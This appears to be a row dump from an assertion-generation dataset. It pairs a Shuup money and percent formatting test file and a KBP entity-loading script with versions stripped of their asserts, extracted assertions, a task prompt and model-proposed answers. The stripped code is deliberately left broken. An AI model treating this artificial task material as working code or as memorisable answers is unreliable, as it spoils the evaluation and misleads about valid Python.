    assert en_percent(""0.99"") == ""99%""


def test_percent_formatter_special_numbers():
    assert en_percent(""0"") == ""0%""
    assert en_percent(""1"") == ""100%""
    assert en_percent(""2"") == ""200%""
    assert en_percent(""3000"") == ""300,000%""
    assert en_percent(""-0.1"") == ""-10%""
    assert en_percent(""-1"") == ""-100%""
    assert en_percent(""-10"") == ""-1,000%""


def test_percent_formatter_default_is_0_digits():
    assert en_percent(""0.111"") == ""11%""
    assert en_percent(""0.111111"") == ""11%""


def test_percent_formatter_more_digits():
    assert en_percent(""0.166"", 1) == ""16.6%""
    assert en_percent(""0.166"", 2) == ""16.60%""
    assert en_percent(""0.166"", 3) == ""16.600%""
    assert en_percent(""0.166"", 9) == ""16.600000000%""
    assert en_percent(""0.1"", 1) == ""10.0%""
    assert en_percent(""0.1"", 2) == ""10.00%""
    assert en_percent(""0.1"", 3) == ""10.000%""
    assert en_percent(""0"", 1) == ""0.0%""


def test_percent_formatter_fewer_digits():
    assert en_percent(""0.11111"", 2) ==  ""11.11%""
    assert en_percent(""0.11111"", 1) ==  ""11.1%""
    assert en_percent(""0.11111"", 0) ==  ""11%""


def test_percent_formatter_fewer_digits_rounding():
    assert en_percent(""0.2714"", 1) == ""27.1%""
    assert en_percent(""0.2715"", 1) == ""27.2%""  # towards even
    assert en_percent(""0.2716"", 1) == ""27.2%""
    assert en_percent(""0.2724"", 1) == ""27.2%""
    assert en_percent(""0.2725"", 1) == ""27.2%""  # towards even
    assert en_percent(""0.2726"", 1) == ""27.3%""


def test_money_formatter_en():
    with translation.override(""en-US""):
        assert money(Money(""29.99"", ""USD"")) == ""$29.99""
        assert money(Money(""29.99"", ""EUR"")) == ""€29.99""
        assert money(Money(""29.99"", ""GBP"")) == ""£29.99""
        assert money(Money(""29.99"", ""CAD"")) == ""CA$29.99""
        assert money(Money(""29.99"", ""JPY"")) == ""¥30""  # No such thing as a decimal yen!
        assert money(Money(""29.99"", ""CNY"")) == ""CN¥29.99""
        assert money(Money(""29.99"", ""KRW"")) == ""₩30""  # the 1/100 subunit ""jeon"" is theoretical and not in use
        assert money(Money(""29.99"", ""SEK"")) == ""kr29.99""


def test_money_formatter_fi():
    with translation.override(""fi-FI""):
        assert money(Money(""29.99"", ""USD"")) == nbsp(""29,99 $"")
        assert money(Money(""29.99"", ""EUR"")) == nbsp(""29,99 €"")
        assert money(Money(""29.99"", ""GBP"")) == nbsp(""29,99 £"")
        assert money(Money(""29.99"", ""CAD"")) == nbsp(""29,99 CAD"")
        assert money(Money(""29.99"", ""JPY"")) == nbsp(""30 ¥"")  # No such thing as a decimal yen!
        assert money(Money(""29.99"", ""CNY"")) == nbsp(""29,99 CNY"")
        assert money(Money(""29.99"", ""KRW"")) == nbsp(""30 KRW"")  # the 1/100 subunit ""jeon"" is theoretical and not in use
        assert money(Money(""29.99"", ""SEK"")) == nbsp(""29,99 SEK"")


def test_money_formatter_default_digit_expanding():
    with translation.override(""en-US""):
        assert money(usd(0)) == ""$0.00""
        assert money(usd(1)) == ""$1.00""


def test_money_formatter_default_digit_rounding():
    with translation.override(""en-US""):
        assert money(usd(""1.234"")) == ""$1.23""
        assert money(usd(""1.235"")) == ""$1.24""
        assert money(usd(""1.244"")) == ""$1.24""
        assert money(usd(""1.245"")) == ""$1.24""
        assert money(usd(""1.254"")) == ""$1.25""
        assert money(usd(""1.255"")) == ""$1.26""
        assert money(usd(""1.111111111111"")) == ""$1.11""


def test_money_formatter_digit_grouping():
    with translation.override(""en-US""):
        assert money(usd(12345678)) == ""$12,345,678.00""
    with translation.override(""fi-FI""):
        assert money(usd(12345678)) == nbsp(""12 345 678,00 $"")
    with translation.override(""ar-QA""):
        assert money(usd(12345678)) == nbsp(""US$ 12,345,678.00"")


def test_money_formatter_with_specified_digits():
    with translation.override(""en-US""):
        assert money(usd(""1234.123456""), digits=0) == ""$1,234""
        assert money(usd(""1234.123456""), digits=1) == ""$1,234.1""
        assert money(usd(""1234.123456""), digits=3) == ""$1,234.123""
        assert money(usd(""1234.123456""), digits=4) == ""$1,234.1235""
        assert money(usd(""1234.123456""), digits=5) == ""$1,234.12346""
        assert money(usd(""1234.123456""), digits=6) == ""$1,234.123456""
    with translation.override(""fi-FI""):
        assert money(usd(""1234.123456""), digits=0) == nbsp(""1 234 $"")
        assert money(usd(""1234.123456""), digits=1) == nbsp(""1 234,1 $"")
        assert money(usd(""1234.123456""), digits=3) == nbsp(""1 234,123 $"")
        assert money(usd(""1234.123456""), digits=4) == nbsp(""1 234,1235 $"")
        assert money(usd(""1234.123456""), digits=5) == nbsp(""1 234,12346 $"")
        assert money(usd(""1234.123456""), digits=6) == nbsp(""1 234,123456 $"")


def test_money_formatter_with_extra_digits():
    with translation.override(""en-US""):
        assert money(usd(""1234.123456""), widen=0) == ""$1,234.12""
        assert money(usd(""1234.123456""), widen=1) == ""$1,234.123""
        assert money(usd(""1234.123456""), widen=2) == ""$1,234.1235""
        assert money(usd(""1234.123456""), widen=3) == ""$1,234.12346""
        assert money(usd(""1234.123456""), widen=4) == ""$1,234.123456""
    with translation.override(""fi-FI""):
        assert money(usd(""1234.123456""), widen=0) == nbsp(""1 234,12 $"")
        assert money(usd(""1234.123456""), widen=1) == nbsp(""1 234,123 $"")
        assert money(usd(""1234.123456""), widen=2) == nbsp(""1 234,1235 $"")
        assert money(usd(""1234.123456""), widen=3) == nbsp(""1 234,12346 $"")
        assert money(usd(""1234.123456""), widen=4) == nbsp(""1 234,123456 $"")
","
1# -*- coding: utf-8 -*-
2# This file is part of Shuup.
3#
4# Copyright (c) 2012-2016, Shoop Ltd. All rights reserved.
5#
6# This source code is licensed under the AGPLv3 license found in the
7# LICENSE file in the root directory of this source tree.
8from __future__ import unicode_literals
9
10from decimal import Decimal
11
12from django.utils import translation
13
14from shuup.core.templatetags.shuup_common import money, number, percent
15from shuup.utils.money import Money
16
17
18def nbsp(x):
19    """"""
20    Convert space to non-breaking space.
21    """"""
22    return x.replace("" "", ""\xa0"")
23
24def usd(value):
25    """"""
26    Get Money with USD currency for given value.
27    """"""
28    return Money(value, ""USD"")
29
30
31def test_number_formatters_en():
32    with translation.override(""en-US""):
33
34
35def test_number_formatters_fi():
36    with translation.override(""fi-FI""):
37
38
39def en_percent(num, ndigits=""not-given""):
40    """"""
41    Format given number as percent in en-US locale.
42    """"""
43    with translation.override(""en-US""):
44        if ndigits == ""not-given"":
45            return percent(Decimal(num))
46        else:
47            return percent(Decimal(num), ndigits)
48
49
50def test_percent_formatter_simple():
51
52
53def test_percent_formatter_special_numbers():
54
55
56def test_percent_formatter_default_is_0_digits():
57
58
59def test_percent_formatter_more_digits():
60
61
62def test_percent_formatter_fewer_digits():
63
64
65def test_percent_formatter_fewer_digits_rounding():
66
67
68def test_money_formatter_en():
69    with translation.override(""en-US""):
70
71
72def test_money_formatter_fi():
73    with translation.override(""fi-FI""):
74
75
76def test_money_formatter_default_digit_expanding():
77    with translation.override(""en-US""):
78
79
80def test_money_formatter_default_digit_rounding():
81    with translation.override(""en-US""):
82
83
84def test_money_formatter_digit_grouping():
85    with translation.override(""en-US""):
86    with translation.override(""fi-FI""):
87    with translation.override(""ar-QA""):
88
89
90def test_money_formatter_with_specified_digits():
91    with translation.override(""en-US""):
92    with translation.override(""fi-FI""):
93
94
95def test_money_formatter_with_extra_digits():
96    with translation.override(""en-US""):
97    with translation.override(""fi-FI""):
98","[['percent(Decimal(""0.38""))', '==', '""38%""'], ['number(Decimal(""38.00000""))', '==', '""38""'], ['number(Decimal(""38.05000""))', '==', '""38.05""'], ['percent(Decimal(""0.38""))', '==', 'nbsp(""38 %"")'], ['number(Decimal(""38.00000""))', '==', '""38""'], ['number(Decimal(""38.05000""))', '==', '""38'], ['en_percent(""0.1"")', '==', '""10%""'], ['en_percent(""0.16"")', '==', '""16%""'], ['en_percent(""0.99"")', '==', '""99%""'], ['en_percent(""0"")', '==', '""0%""'], ['en_percent(""1"")', '==', '""100%""'], ['en_percent(""2"")', '==', '""200%""'], ['en_percent(""3000"")', '==', '""300'], ['en_percent(""-0.1"")', '==', '""-10%""'], ['en_percent(""-1"")', '==', '""-100%""'], ['en_percent(""-10"")', '==', '""-1'], ['en_percent(""0.111"")', '==', '""11%""'], ['en_percent(""0.111111"")', '==', '""11%""'], ['en_percent(""0.166""', '==', 'True'], ['en_percent(""0.166""', '==', 'True'], ['en_percent(""0.166""', '==', 'True'], ['en_percent(""0.166""', '==', 'True'], ['en_percent(""0.1""', '==', 'True'], ['en_percent(""0.1""', '==', 'True'], ['en_percent(""0.1""', '==', 'True'], ['en_percent(""0""', '==', 'True'], ['en_percent(""0.11111""', '==', 'True'], ['en_percent(""0.11111""', '==', 'True'], ['en_percent(""0.11111""', '==', 'True'], ['en_percent(""0.2714""', '==', 'True'], ['en_percent(""0.2715""', '==', 'True'], ['en_percent(""0.2716""', '==', 'True'], ['en_percent(""0.2724""', '==', 'True'], ['en_percent(""0.2725""', '==', 'True'], ['en_percent(""0.2726""', '==', 'True'], ['money(Money(""29.99""', '==', 'True'], ['money(Money(""29.99""', '==', 'True'], ['money(Money(""29.99""', '==', 'True'], ['money(Money(""29.99""', '==', 'True'], ['money(Money(""29.99""', '==', 'True'], ['money(Money(""29.99""', '==', 'True'], ['money(Money(""29.99""', '==', 'True'], ['money(Money(""29.99""', '==', 'True'], ['money(Money(""29.99""', '==', 'True'], ['money(Money(""29.99""', '==', 'True'], ['money(Money(""29.99""', '==', 'True'], ['money(Money(""29.99""', '==', 'True'], ['money(Money(""29.99""', '==', 'True'], ['money(Money(""29.99""', '==', 'True'], ['money(usd(0))', '==', '""$0.00""'], ['money(usd(1))', '==', '""$1.00""'], ['money(usd(""1.234""))', '==', '""$1.23""'], ['money(usd(""1.235""))', '==', '""$1.24""'], ['money(usd(""1.244""))', '==', '""$1.24""'], ['money(usd(""1.245""))', '==', '""$1.24""'], ['money(usd(""1.254""))', '==', '""$1.25""'], ['money(usd(""1.255""))', '==', '""$1.26""'], ['money(usd(""1.111111111111""))', '==', '""$1.11""'], ['money(usd(12345678))', '==', '""$12'], ['money(usd(12345678))', '==', 'nbsp(""12 345 678'], ['money(usd(12345678))', '==', 'nbsp(""US$ 12'], ['money(usd(""1234.123456"")', '==', 'True'], ['money(usd(""1234.123456"")', '==', 'True'], ['money(usd(""1234.123456"")', '==', 'True'], ['money(usd(""1234.123456"")', '==', 'True'], ['money(usd(""1234.123456"")', '==', 'True'], ['money(usd(""1234.123456"")', '==', 'True'], ['money(usd(""1234.123456"")', '==', 'True'], ['money(usd(""1234.123456"")', '==', 'True'], ['money(usd(""1234.123456"")', '==', 'True'], ['money(usd(""1234.123456"")', '==', 'True'], ['money(usd(""1234.123456"")', '==', 'True'], ['money(usd(""1234.123456"")', '==', 'True'], ['money(usd(""1234.123456"")', '==', 'True'], ['money(usd(""1234.123456"")', '==', 'True'], ['money(usd(""1234.123456"")', '==', 'True'], ['money(usd(""1234.123456"")', '==', 'True'], ['money(usd(""1234.123456"")', '==', 'True'], ['money(usd(""1234.123456"")', '==', 'True'], ['money(usd(""1234.123456"")', '==', 'True'], ['money(usd(""1234.123456"")', '==', 'True'], ['money(usd(""1234.123456"")', '==', 'True'], ['money(usd(""1234.123456"")', '==', 'True']]",85,83,0.976470588235294,0.0117763904653802,"['x', 'value', 'num', 'ndigits']",4,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['x', 'value', 'num', 'ndigits']
*Code:

1# -*- coding: utf-8 -*-
2# This file is part of Shuup.
3#
4# Copyright (c) 2012-2016, Shoop Ltd. All rights reserved.
5#
6# This source code is licensed under the AGPLv3 license found in the
7# LICENSE file in the root directory of this source tree.
8from __future__ import unicode_literals
9
10from decimal import Decimal
11
12from django.utils import translation
13
14from shuup.core.templatetags.shuup_common import money, number, percent
15from shuup.utils.money import Money
16
17
18def nbsp(x):
19    """"""
20    Convert space to non-breaking space.
21    """"""
22    return x.replace("" "", ""\xa0"")
23
24def usd(value):
25    """"""
26    Get Money with USD currency for given value.
27    """"""
28    return Money(value, ""USD"")
29
30
31def test_number_formatters_en():
32    with translation.override(""en-US""):
33
34
35def test_number_formatters_fi():
36    with translation.override(""fi-FI""):
37
38
39def en_percent(num, ndigits=""not-given""):
40    """"""
41    Format given number as percent in en-US locale.
42    """"""
43    with translation.override(""en-US""):
44        if ndigits == ""not-given"":
45            return percent(Decimal(num))
46        else:
47            return percent(Decimal(num), ndigits)
48
49
50def test_percent_formatter_simple():
51
52
53def test_percent_formatter_special_numbers():
54
55
56def test_percent_formatter_default_is_0_digits():
57
58
59def test_percent_formatter_more_digits():
60
61
62def test_percent_formatter_fewer_digits():
63
64
65def test_percent_formatter_fewer_digits_rounding():
66
67
68def test_money_formatter_en():
69    with translation.override(""en-US""):
70
71
72def test_money_formatter_fi():
73    with translation.override(""fi-FI""):
74
75
76def test_money_formatter_default_digit_expanding():
77    with translation.override(""en-US""):
78
79
80def test_money_formatter_default_digit_rounding():
81    with translation.override(""en-US""):
82
83
84def test_money_formatter_digit_grouping():
85    with translation.override(""en-US""):
86    with translation.override(""fi-FI""):
87    with translation.override(""ar-QA""):
88
89
90def test_money_formatter_with_specified_digits():
91    with translation.override(""en-US""):
92    with translation.override(""fi-FI""):
93
94
95def test_money_formatter_with_extra_digits():
96    with translation.override(""en-US""):
97    with translation.override(""fi-FI""):
98",3761,"[[18, 'x', '!=', None, 'The nbsp function requires a non-null input'],
 [24, 'value', '!=', None, 'usd function requires a non-null value'],
 [39, 'num', '!=', None, 'The input integer for percent formatting should not be null'],
 [39, 'ndigits', '>=', 0, 'The number of digits should be non-negative']]"
nanalelfe/fofe-ner,"#!/home/chwang/anaconda2/envs/tensorflow/bin/python

from itertools import izip, islice, imap, combinations, chain
import logging
import thread, threading, os
import Queue
from LinkingUtil import LoadED

logger = logging.getLogger()

def LoadED( rspecifier, language = 'eng' ):
    print(""in Load ED"")

    entity2cls = {  # KBP2015 label
                    'PER_NAM' : 0, 
                    'PER_NOM' : 5, 
                    'ORG_NAM' : 1, 
                    'GPE_NAM' : 2, 
                    'LOC_NAM' : 3, 
                    'FAC_NAM' : 4, 
                    'TTL_NAM' : 5,

                    # iflytek label
                    'PER_NAME' : 0,  
                    'ORG_NAME' : 1, 
                    'GPE_NAME' : 2, 
                    'LOC_NAME' : 3, 
                    'FAC_NAME' : 4, 
                    'PER_NOMINAL' : 5,
                    'ORG_NOMINAL' : 6,
                    'GPE_NOMINAL' : 7,
                    'LOC_NOMINAL' : 8,
                    'FAC_NOMINAL' : 9,
                    'PER_NOM' : 5,
                    'ORG_NOM' : 6,
                    'GPE_NOM' : 7,
                    'LOC_NOM' : 8,
                    'FAC_NOM' : 9,
                    'TITLE_NAME' : 5,
                    'TITLE_NOMINAL' : 5
                } 

    if os.path.isfile( rspecifier ):
        with codecs.open( rspecifier, 'rb', 'utf8' ) as fp:
            processed, original = fp.read().split( u'=' * 128, 1 )
            original = original.strip()

            # texts, tags, failures = processed.split( u'\n\n\n', 2 )
            texts = processed.split( u'\n\n\n' )[0]
            for text in texts.split( u'\n\n' ):
                parts = text.split( u'\n' )
                # assert len(parts) in [2, 3], 'sentence, offsets, labels(optional)'
                if len( parts ) not in [2, 3]:
                    logger.exception( text )
                    continue

                sent, boe, eoe, target, mids, spelling = parts[0].split(u' '), [], [], [], [], []
                offsets = map( lambda x : (int(x[0]), int(x[1])),
                               [ offsets[1:-1].split(u',') for offsets in parts[1].split() ] )
                assert len(offsets) == len(sent), rspecifier + '\n' + \
                        str( offsets ) + '\n' + str( sent ) + '\n%d vs %d' % (len(offsets), len(sent))

                if len(parts) == 3:
                    for ans in parts[-1].split():
                        try:
                            begin_idx, end_idx, mid, mention1, mention2 = ans[1:-1].split(u',')
                            target.append( entity2cls[str(mention1 + u'_' + mention2)] )
                            boe.append( int(begin_idx) )
                            eoe.append( int(end_idx) )
                            mids.append( mid )
                            spelling.append( original[ offsets[boe[-1]][0] : offsets[eoe[-1] - 1][1] ] )
                        except ValueError as ex1:
                            logger.exception( rspecifier )
                            logger.exception( ans )
                        except KeyError as ex2:
                            logger.exception( rspecifier )
                            logger.exception( ans )

                        try:
                            assert 0 <= boe[-1] < eoe[-1] <= len(sent), \
                                    '%s  %d  ' % (rspecifier.split('/')[-1], len(sent)) + \
                                    '  '.join( str(x) for x in [sent, boe, eoe, target, mids] )
                        except IndexError as ex:
                            logger.exception( rspecifier )
                            logger.exception( str(boe) + '   ' + str(eoe) )
                            continue
                    assert( len(boe) == len(eoe) == len(target) == len(mids) )

                # move this part to processed_sentence
                # if language == 'eng':
                #     for i,w in enumerate( sent ):
                #         sent[i] = u''.join( c if 0 <= ord(c) < 128 else chr(0) for c in list(w) )
                yield sent, boe, eoe, target, mids, spelling


    else:
        for filename in os.listdir( rspecifier ):
            for X in LoadED( os.path.join( rspecifier, filename ), language ):
                yield X

def KBP(path, iflytek=None):
    files = list(os.listdir(path))[:]
    if iflytek is not None:
        files += list(os.listdir(iflytek))[:]
    while len(files) != 0:
        filename = files[0]
        while True:
            queueLock.acquire()
            print(""KBP acquired the lock"")
            if not kbp_queue.full():
                print(""Putting file "" + filename + "" info the queue."")
                generator = LoadED(filename)
                print(""LoadED generated"")
                kbp_queue.put(generator)
                print(""Put into queue"")
                files.remove(filename)
                queueLock.release()
                break
            print(""Almost there"")

            queueLock.release()
            print(""KBP released the lock"")
    while True:
        if not kbp_queue.full():
            kbp_queue.put(None)
            break

def consumer():
    while True:
        queueLock.acquire()
        print(""consumer acquired the lock"")
        if not kbp_queue.empty():
            next_gen = kbp_queue.get()
            if next_gen is None:
                print(""Returned None."")
                break
            print(""Got the next generator."")
        queueLock.release()
        print(""consumer released the lock"")


if __name__ == '__main__':
    print(""starting now"")

    BUF_SIZE = 2
    kbp_queue = Queue.Queue(BUF_SIZE)
    queueLock = threading.Lock()

    thread.start_new_thread(KBP, (""/home/chwang/nana/mock"",))
    # try:
    #     threading.start_new_thread(KBP, (""/home/chwang/nana/EDL-DATA/KBP-EDL-2015/eng-train-parsed"",))

    # except:
    #     print(""Error: unable to start thread"")

    consumer()

    # generator = KBP(""/home/chwang/nana/EDL-DATA/KBP-EDL-2015/eng-train-parsed"")
    # for item in generator:
    #     print(item)
","
1#!/home/chwang/anaconda2/envs/tensorflow/bin/python
2
3from itertools import izip, islice, imap, combinations, chain
4import logging
5import thread, threading, os
6import Queue
7from LinkingUtil import LoadED
8
9logger = logging.getLogger()
10
11def LoadED( rspecifier, language = 'eng' ):
12    print(""in Load ED"")
13
14    entity2cls = {  # KBP2015 label
15                    'PER_NAM' : 0, 
16                    'PER_NOM' : 5, 
17                    'ORG_NAM' : 1, 
18                    'GPE_NAM' : 2, 
19                    'LOC_NAM' : 3, 
20                    'FAC_NAM' : 4, 
21                    'TTL_NAM' : 5,
22
23                    # iflytek label
24                    'PER_NAME' : 0,  
25                    'ORG_NAME' : 1, 
26                    'GPE_NAME' : 2, 
27                    'LOC_NAME' : 3, 
28                    'FAC_NAME' : 4, 
29                    'PER_NOMINAL' : 5,
30                    'ORG_NOMINAL' : 6,
31                    'GPE_NOMINAL' : 7,
32                    'LOC_NOMINAL' : 8,
33                    'FAC_NOMINAL' : 9,
34                    'PER_NOM' : 5,
35                    'ORG_NOM' : 6,
36                    'GPE_NOM' : 7,
37                    'LOC_NOM' : 8,
38                    'FAC_NOM' : 9,
39                    'TITLE_NAME' : 5,
40                    'TITLE_NOMINAL' : 5
41                } 
42
43    if os.path.isfile( rspecifier ):
44        with codecs.open( rspecifier, 'rb', 'utf8' ) as fp:
45            processed, original = fp.read().split( u'=' * 128, 1 )
46            original = original.strip()
47
48            # texts, tags, failures = processed.split( u'\n\n\n', 2 )
49            texts = processed.split( u'\n\n\n' )[0]
50            for text in texts.split( u'\n\n' ):
51                parts = text.split( u'\n' )
52                if len( parts ) not in [2, 3]:
53                    logger.exception( text )
54                    continue
55
56                sent, boe, eoe, target, mids, spelling = parts[0].split(u' '), [], [], [], [], []
57                offsets = map( lambda x : (int(x[0]), int(x[1])),
58                               [ offsets[1:-1].split(u',') for offsets in parts[1].split() ] )
59                        str( offsets ) + '\n' + str( sent ) + '\n%d vs %d' % (len(offsets), len(sent))
60
61                if len(parts) == 3:
62                    for ans in parts[-1].split():
63                        try:
64                            begin_idx, end_idx, mid, mention1, mention2 = ans[1:-1].split(u',')
65                            target.append( entity2cls[str(mention1 + u'_' + mention2)] )
66                            boe.append( int(begin_idx) )
67                            eoe.append( int(end_idx) )
68                            mids.append( mid )
69                            spelling.append( original[ offsets[boe[-1]][0] : offsets[eoe[-1] - 1][1] ] )
70                        except ValueError as ex1:
71                            logger.exception( rspecifier )
72                            logger.exception( ans )
73                        except KeyError as ex2:
74                            logger.exception( rspecifier )
75                            logger.exception( ans )
76
77                        try:
78                                    '%s  %d  ' % (rspecifier.split('/')[-1], len(sent)) + \
79                                    '  '.join( str(x) for x in [sent, boe, eoe, target, mids] )
80                        except IndexError as ex:
81                            logger.exception( rspecifier )
82                            logger.exception( str(boe) + '   ' + str(eoe) )
83                            continue
84
85                # move this part to processed_sentence
86                # if language == 'eng':
87                #     for i,w in enumerate( sent ):
88                #         sent[i] = u''.join( c if 0 <= ord(c) < 128 else chr(0) for c in list(w) )
89                yield sent, boe, eoe, target, mids, spelling
90
91
92    else:
93        for filename in os.listdir( rspecifier ):
94            for X in LoadED( os.path.join( rspecifier, filename ), language ):
95                yield X
96
97def KBP(path, iflytek=None):
98    files = list(os.listdir(path))[:]
99    if iflytek is not None:
100        files += list(os.listdir(iflytek))[:]
101    while len(files) != 0:
102        filename = files[0]
103        while True:
104            queueLock.acquire()
105            print(""KBP acquired the lock"")
106            if not kbp_queue.full():
107                print(""Putting file "" + filename + "" info the queue."")
108                generator = LoadED(filename)
109                print(""LoadED generated"")
110                kbp_queue.put(generator)
111                print(""Put into queue"")
112                files.remove(filename)
113                queueLock.release()
114                break
115            print(""Almost there"")
116
117            queueLock.release()
118            print(""KBP released the lock"")
119    while True:
120        if not kbp_queue.full():
121            kbp_queue.put(None)
122            break
123
124def consumer():
125    while True:
126        queueLock.acquire()
127        print(""consumer acquired the lock"")
128        if not kbp_queue.empty():
129            next_gen = kbp_queue.get()
130            if next_gen is None:
131                print(""Returned None."")
132                break
133            print(""Got the next generator."")
134        queueLock.release()
135        print(""consumer released the lock"")
136
137
138if __name__ == '__main__':
139    print(""starting now"")
140
141    BUF_SIZE = 2
142    kbp_queue = Queue.Queue(BUF_SIZE)
143    queueLock = threading.Lock()
144
145    thread.start_new_thread(KBP, (""/home/chwang/nana/mock"",))
146    # try:
147    #     threading.start_new_thread(KBP, (""/home/chwang/nana/EDL-DATA/KBP-EDL-2015/eng-train-parsed"",))
148
149    # except:
150    #     print(""Error: unable to start thread"")
151
152    consumer()
153
154    # generator = KBP(""/home/chwang/nana/EDL-DATA/KBP-EDL-2015/eng-train-parsed"")
155    # for item in generator:
156    #     print(item)
157","[['len(offsets)', '==', 'len(sent)'], ['0', '<=', 'boe[-1] < eoe[-1] <= len(sent)']]",4,2,0.5,0.0003282455276546,"['logger', 'rspecifier', 'language', 'entity2cls', 'processed', 'original', '# texts', 'tags', 'failures', 'texts', 'parts', 'sent', 'boe', 'eoe', 'target', 'mids', 'spelling', 'offsets', 'begin_idx', 'end_idx', 'mid', 'mention1', 'mention2', '#         sent[i]', 'path', 'iflytek', 'files', 'filename', 'generator', 'next_gen', 'BUF_SIZE', 'kbp_queue', 'queueLock', '# generator']",34,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['logger', 'rspecifier', 'language', 'entity2cls', 'processed', 'original', '# texts', 'tags', 'failures', 'texts', 'parts', 'sent', 'boe', 'eoe', 'target', 'mids', 'spelling', 'offsets', 'begin_idx', 'end_idx', 'mid', 'mention1', 'mention2', '#         sent[i]', 'path', 'iflytek', 'files', 'filename', 'generator', 'next_gen', 'BUF_SIZE', 'kbp_queue', 'queueLock', '# generator']
*Code:

1#!/home/chwang/anaconda2/envs/tensorflow/bin/python
2
3from itertools import izip, islice, imap, combinations, chain
4import logging
5import thread, threading, os
6import Queue
7from LinkingUtil import LoadED
8
9logger = logging.getLogger()
10
11def LoadED( rspecifier, language = 'eng' ):
12    print(""in Load ED"")
13
14    entity2cls = {  # KBP2015 label
15                    'PER_NAM' : 0, 
16                    'PER_NOM' : 5, 
17                    'ORG_NAM' : 1, 
18                    'GPE_NAM' : 2, 
19                    'LOC_NAM' : 3, 
20                    'FAC_NAM' : 4, 
21                    'TTL_NAM' : 5,
22
23                    # iflytek label
24                    'PER_NAME' : 0,  
25                    'ORG_NAME' : 1, 
26                    'GPE_NAME' : 2, 
27                    'LOC_NAME' : 3, 
28                    'FAC_NAME' : 4, 
29                    'PER_NOMINAL' : 5,
30                    'ORG_NOMINAL' : 6,
31                    'GPE_NOMINAL' : 7,
32                    'LOC_NOMINAL' : 8,
33                    'FAC_NOMINAL' : 9,
34                    'PER_NOM' : 5,
35                    'ORG_NOM' : 6,
36                    'GPE_NOM' : 7,
37                    'LOC_NOM' : 8,
38                    'FAC_NOM' : 9,
39                    'TITLE_NAME' : 5,
40                    'TITLE_NOMINAL' : 5
41                } 
42
43    if os.path.isfile( rspecifier ):
44        with codecs.open( rspecifier, 'rb', 'utf8' ) as fp:
45            processed, original = fp.read().split( u'=' * 128, 1 )
46            original = original.strip()
47
48            # texts, tags, failures = processed.split( u'\n\n\n', 2 )
49            texts = processed.split( u'\n\n\n' )[0]
50            for text in texts.split( u'\n\n' ):
51                parts = text.split( u'\n' )
52                if len( parts ) not in [2, 3]:
53                    logger.exception( text )
54                    continue
55
56                sent, boe, eoe, target, mids, spelling = parts[0].split(u' '), [], [], [], [], []
57                offsets = map( lambda x : (int(x[0]), int(x[1])),
58                               [ offsets[1:-1].split(u',') for offsets in parts[1].split() ] )
59                        str( offsets ) + '\n' + str( sent ) + '\n%d vs %d' % (len(offsets), len(sent))
60
61                if len(parts) == 3:
62                    for ans in parts[-1].split():
63                        try:
64                            begin_idx, end_idx, mid, mention1, mention2 = ans[1:-1].split(u',')
65                            target.append( entity2cls[str(mention1 + u'_' + mention2)] )
66                            boe.append( int(begin_idx) )
67                            eoe.append( int(end_idx) )
68                            mids.append( mid )
69                            spelling.append( original[ offsets[boe[-1]][0] : offsets[eoe[-1] - 1][1] ] )
70                        except ValueError as ex1:
71                            logger.exception( rspecifier )
72                            logger.exception( ans )
73                        except KeyError as ex2:
74                            logger.exception( rspecifier )
75                            logger.exception( ans )
76
77                        try:
78                                    '%s  %d  ' % (rspecifier.split('/')[-1], len(sent)) + \
79                                    '  '.join( str(x) for x in [sent, boe, eoe, target, mids] )
80                        except IndexError as ex:
81                            logger.exception( rspecifier )
82                            logger.exception( str(boe) + '   ' + str(eoe) )
83                            continue
84
85                # move this part to processed_sentence
86                # if language == 'eng':
87                #     for i,w in enumerate( sent ):
88                #         sent[i] = u''.join( c if 0 <= ord(c) < 128 else chr(0) for c in list(w) )
89                yield sent, boe, eoe, target, mids, spelling
90
91
92    else:
93        for filename in os.listdir( rspecifier ):
94            for X in LoadED( os.path.join( rspecifier, filename ), language ):
95                yield X
96
97def KBP(path, iflytek=None):
98    files = list(os.listdir(path))[:]
99    if iflytek is not None:
100        files += list(os.listdir(iflytek))[:]
101    while len(files) != 0:
102        filename = files[0]
103        while True:
104            queueLock.acquire()
105            print(""KBP acquired the lock"")
106            if not kbp_queue.full():
107                print(""Putting file "" + filename + "" info the queue."")
108                generator = LoadED(filename)
109                print(""LoadED generated"")
110                kbp_queue.put(generator)
111                print(""Put into queue"")
112                files.remove(filename)
113                queueLock.release()
114                break
115            print(""Almost there"")
116
117            queueLock.release()
118            print(""KBP released the lock"")
119    while True:
120        if not kbp_queue.full():
121            kbp_queue.put(None)
122            break
123
124def consumer():
125    while True:
126        queueLock.acquire()
127        print(""consumer acquired the lock"")
